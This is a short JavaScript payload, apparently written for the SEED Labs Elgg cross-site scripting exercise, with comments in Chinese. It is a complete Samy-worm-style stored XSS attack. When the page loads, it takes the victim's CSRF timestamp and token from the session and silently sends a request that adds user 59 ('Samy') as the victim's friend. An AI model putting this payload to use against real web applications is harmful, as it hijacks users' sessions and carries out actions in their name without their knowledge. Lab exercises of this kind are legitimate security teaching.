<script type="text/javascript">
window.onload = function () {
    var friendId = 59;  // Samy 的 ID
    var ts = elgg.security.token.__elgg_ts;  // 获取 CSRF 时间戳
    var token = elgg.security.token.__elgg_token;  // 获取 CSRF 令牌

    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + friendId + 
                  "&__elgg_ts=" + ts + 
                  "&__elgg_token=" + token;

    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
